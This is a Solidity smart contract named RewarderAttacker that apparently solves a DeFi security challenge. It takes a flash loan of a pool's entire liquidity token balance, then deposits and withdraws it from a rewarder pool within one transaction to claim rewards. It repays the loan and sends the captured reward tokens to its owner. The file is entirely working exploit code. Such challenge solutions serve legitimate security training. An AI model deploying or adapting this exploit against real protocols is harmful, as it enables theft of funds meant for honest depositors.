pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}



contract RewarderAttacker {

    address private owner;
    IRewarderPool private _pool;
    IFlashLoanerPool private _flashLoanPool;

    IERC20 _liquidityToken;
    IERC20 _rewardToken;
    
    constructor(IRewarderPool pool, IFlashLoanerPool flashLoanPool, IERC20 liquidityToken , IERC20 rewardToken) {
        owner = msg.sender;
        _pool = pool;
        _flashLoanPool = flashLoanPool;
        _liquidityToken = liquidityToken;
        _rewardToken = rewardToken;

    }

    function attack() public {

        require(owner == msg.sender);

        uint256 flashLoanLiquidityTokenBalance  = _liquidityToken.balanceOf(address(_flashLoanPool));

        _liquidityToken.approve(address(_pool), flashLoanLiquidityTokenBalance);
        _flashLoanPool.flashLoan(flashLoanLiquidityTokenBalance);

        uint256 rewardTokenBalance = _rewardToken.balanceOf(address(this));

        require(rewardTokenBalance > 0, "reward balance was 0");
        bool success = _rewardToken.transfer(owner, rewardTokenBalance);

        require(success, "reward token transfer failed");

    }

    function receiveFlashLoan(uint256 amount) external{
        _pool.deposit(amount);
        _pool.withdraw(amount);

        _liquidityToken.transfer(address(_flashLoanPool), amount);
    }

    receive () external payable {}


}